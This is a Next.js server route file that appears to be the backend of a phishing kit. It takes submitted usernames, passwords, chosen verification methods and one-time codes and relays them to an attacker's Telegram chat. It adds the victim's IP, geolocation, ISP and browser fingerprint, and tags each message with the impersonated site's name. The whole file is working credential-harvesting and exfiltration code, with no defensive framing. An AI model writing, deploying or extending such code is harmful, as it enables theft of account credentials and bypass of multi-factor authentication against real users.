import { NextResponse } from 'next/server';
import { PROJECT_DISPLAY_NAME } from '@/lib/project-config';
import { wrapFlowMessage } from '@/lib/telegram';

function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function asCode(v) {
  const t = v == null || v === '' ? 'Unknown' : String(v).trim() || 'Unknown';
  return `<code>${escapeHtml(t)}</code>`;
}

function asPre(v) {
  const t = v == null ? '' : String(v);
  return `<pre>${escapeHtml(t || 'Unknown')}</pre>`;
}

function methodLabel(method) {
  switch (method) {
    case 'call':
      return 'Phone Call';
    case 'text':
    case 'sms':
      return 'Text Message (SMS)';
    case 'email':
      return 'Email';
    default:
      return method || 'Unknown';
  }
}

function buildTelegramMessage(params) {
  const visitorBlock = `<b>🌐 New Visitor</b>
━━━━━━━━━━━━━━━━━━
🏷️ Site: ${asCode(params.siteName)}

📍 Location: ${asCode(params.location)}
🌍 IP: ${asCode(params.ip)}
⏰ Timezone: ${asCode(params.timezone)}
🌐 ISP: ${asCode(params.isp)}

📱 Device:
${asPre(params.client.userAgent)}
🖥️ Screen: ${asCode(params.client.screen)}
🌍 Language: ${asCode(params.client.language)}
🔗 Referrer: ${asCode(params.client.referrer)}
🌐 URL: ${asCode(params.client.url)}

⏰ Local Time: ${asCode(params.client.localTime)}
🕒 UTC Time: ${asCode(params.client.utcTime)}`;

  switch (params.eventType) {
    case 'visit':
      return visitorBlock;
    case 'login':
      return `🏷️ Site: ${asCode(params.siteName)}

<b>🔐 Login Attempt</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${asCode(params.userId)}
🔒 Password: ${asCode(params.password)}`;
    case 'method':
      return `🏷️ Site: ${asCode(params.siteName)}

<b>🔐 Verify Your Identity</b>
━━━━━━━━━━━━━━━━━━
Method Selected: ${asCode(methodLabel(params.method))}`;
    case 'verification':
      return `🏷️ Site: ${asCode(params.siteName)}

<b>🔑 Verification Code Submitted</b>
━━━━━━━━━━━━━━━━━━
🔢 Code: ${asCode(params.code)}`;
    case 'resend':
      return `🏷️ Site: ${asCode(params.siteName)}

<b>🔁 Resend Code Requested</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${asCode(params.userId)}`;
    case 'changeMethod':
      return `🏷️ Site: ${asCode(params.siteName)}

<b>🔁 Use a Different Method</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${asCode(params.userId)}
🔒 Password: ${asCode(params.password)}
📲 Current method: ${asCode(methodLabel(params.method))}
🌍 IP: ${asCode(params.ip)}
📍 Location: ${asCode(params.location)}`;
    case 'backToLogin':
      return `🏷️ Site: ${asCode(params.siteName)}

<b>↩️ Back to Login Selected</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${asCode(params.userId)}
🔒 Password: ${asCode(params.password)}
📲 Method: ${asCode(methodLabel(params.method))}
🌍 IP: ${asCode(params.ip)}
📍 Location: ${asCode(params.location)}`;
    default:
      return visitorBlock;
  }
}

async function fetchGeoData(ip) {
  let location = 'Unknown';
  let timezone = 'Unknown';
  let isp = 'Unknown';

  if (!ip || ip === 'Unknown') {
    return { location, timezone, isp };
  }

  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`, { cache: 'no-store' });
    if (!res.ok) return { location, timezone, isp };
    const data = await res.json();
    const parts = [data.city, data.region, data.country_name].filter(Boolean);
    if (parts.length > 0) location = parts.join(', ');
    if (data.timezone) timezone = data.timezone;
    if (data.org || data.asn) isp = data.org || data.asn || isp;
  } catch {
    // Best effort
  }

  return { location, timezone, isp };
}

export async function POST(req) {
  try {
    const body = await req.json();

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatEnv = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatEnv) {
      return NextResponse.json({ ok: false, error: 'Telegram is not configured' }, { status: 500 });
    }

    const chatIds = chatEnv.split(/[,\s]+/).map((id) => id.trim()).filter(Boolean);
    if (chatIds.length === 0) {
      return NextResponse.json({ ok: false, error: 'No TELEGRAM_CHAT_ID configured' }, { status: 500 });
    }

    const forwardedFor = req.headers.get('x-forwarded-for');
    const ip = forwardedFor?.split(',')[0]?.trim() || 'Unknown';
    const geo = await fetchGeoData(ip);

    const client = body.client || {
      userAgent: '',
      screen: '',
      language: '',
      referrer: '',
      url: '',
      localTime: '',
      utcTime: '',
    };
    const eventType = body.eventType ?? body.stage ?? 'verification';
    const message = buildTelegramMessage({
      ip,
      location: geo.location,
      timezone: geo.timezone,
      isp: geo.isp,
      userId: body.userId ?? '',
      password: body.password ?? '',
      method: body.method ?? '',
      code: body.code ?? '',
      client,
      eventType,
      siteName: body.siteName || PROJECT_DISPLAY_NAME,
    });

    const telegramEndpoint = `https://api.telegram.org/bot${token}/sendMessage`;
    const outbound = eventType === 'visit' ? message : wrapFlowMessage(message);
    await Promise.all(
      chatIds.map(async (chatId) => {
        const res = await fetch(telegramEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: outbound,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
          }),
        });
        if (!res.ok) {
          const text = await res.text().catch(() => '');
          throw new Error(`Telegram send failed for chat ${chatId}: ${res.status} ${text}`);
        }
      })
    );

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Error sending Telegram notification', error);
    return NextResponse.json({ ok: false, error: 'Failed to send Telegram notification' }, { status: 500 });
  }
}
